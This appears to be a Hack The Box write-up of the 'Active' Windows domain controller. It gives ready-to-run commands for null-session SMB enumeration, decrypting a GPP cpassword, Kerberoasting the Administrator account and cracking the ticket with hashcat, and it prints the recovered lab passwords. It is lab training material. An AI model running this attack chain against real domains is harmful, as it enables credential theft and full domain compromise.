# HTB Machine: Active

## Overview
Active is a Windows domain-joined machine running Active Directory services. The attack path involves discovering credentials via SMB enumeration, leveraging Group Policy Preferences (GPP) to obtain initial access, and performing Kerberoasting to compromise the domain administrator.

## Reconnaissance

### Port Scanning
Initial port scanning revealed numerous open ports typical of a Windows Domain Controller:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.1.77 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.1.77 -oN nmap
sudo nmap 10.129.1.77 -sU -oN nmap_UDP
```

### Key Findings
| Port | Service | Details |
|------|---------|---------|
| 53/tcp | DNS | Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1) |
| 88/tcp | Kerberos | Microsoft Windows Kerberos |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 389/tcp | LDAP | Domain: active.htb |
| 445/tcp | SMB | Microsoft-ds |
| 3268/tcp | LDAP | Global Catalog |

## Initial Access

### SMB Enumeration with Null Session
The machine allowed null session authentication, enabling me to enumerate shares:

```bash
enum4linux-ng 10.129.1.77 -A -C
```
<img width="511" height="192" alt="image" src="https://github.com/user-attachments/assets/c9f88ad7-611f-40ba-9091-dff52c325007" />

```bash
nxc smb 10.129.1.77 -u '' -p '' --shares
```
<img width="429" height="191" alt="image" src="https://github.com/user-attachments/assets/fa102c61-c6f0-4941-af0e-7df40e8ed3e3" />


The `Replication` share was readable with null credentials:

```bash
smbclient //10.129.1.77/Replication -N
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

### Finding GPP Credentials
While analyzing the downloaded files, I found credentials in:
`active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`
<img width="637" height="296" alt="image" src="https://github.com/user-attachments/assets/2e74f27c-adf3-4a81-b775-9e5209f791a2" />


The file contained a `cpassword` field for user `active.htb\SVC_TGS`:
```
cpassword: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

The password was decrypted using `gpp-decrypt`:
```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```
**Password: GPPstillStandingStrong2k18**

With these credentials performed rid-bruteforce to identify usernames:
```bash
nxc smb 10.129.1.77 -u SVC_TGS -p 'GPPstillStandingStrong2k18' --rid-brute
```

<img width="563" height="363" alt="image" src="https://github.com/user-attachments/assets/eb9e8f83-dd5b-4425-8872-f45fb9e2ff40" />


## User Flag

### Accessing SVC_TGS Share
With valid credentials, I enumerated accessible shares:

```bash
nxc smb 10.129.1.77 -u SVC_TGS -p 'GPPstillStandingStrong2k18' --shares
```
<img width="447" height="196" alt="image" src="https://github.com/user-attachments/assets/56640d6e-192c-4de8-81e8-9c7dc0b3e825" />


The `Users` share was accessible, containing the SVC_TGS desktop:

```bash
smbclient //10.129.1.77/Users -U SVC_TGS%'GPPstillStandingStrong2k18'
smb: \> recurse ON
smb: \> prompt OFF
smb: \> cd SVC_TGS\Desktop
smb: \> mget *
```

**User Flag**: Located in `user.txt` on the SVC_TGS desktop.

## Privilege Escalation

### Bloodhound Enumeration
To map the domain and identify privilege escalation paths:

```bash
bloodhound-python -u SVC_TGS -p 'GPPstillStandingStrong2k18' -ns 10.129.1.77 -d active.htb -c all --zip
```

Analysis revealed potential Kerberoasting opportunities.

### Kerberoasting Attack
The Administrator account was kerberoastable. 

<img width="1140" height="615" alt="image" src="https://github.com/user-attachments/assets/f6542e2d-f9f5-4553-b87c-1e344325ea55" />


Using Impacket's GetUserSPNs:

```bash
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.129.1.77 active.htb/SVC_TGS -request-user Administrator -outputfile Administrator
```

The resulting TGS ticket was encrypted with RC4 (`$krb5tgs$23$`):

<img width="581" height="204" alt="image" src="https://github.com/user-attachments/assets/67fc96ff-a795-4102-a3ab-7938b5c0f74c" />


Cracked the TGS ticket:

```bash
hashcat -m 13100 Administrator /usr/share/wordlists/rockyou.txt -O
```
**Administrator Password: Ticketmaster1968**

## Root Flag

### Administrator Access
With the cracked Administrator credentials, I accessed the SMB share:

```bash
smbclient //10.129.1.77/Users -U Administrator%'Ticketmaster1968'
cd Administrator\Desktop
get root.txt
```
<img width="625" height="175" alt="image" src="https://github.com/user-attachments/assets/388e633d-ea56-4a5b-8dd3-5e14aec1057d" />

**Root Flag**: Located in `root.txt` on the Administrator desktop.
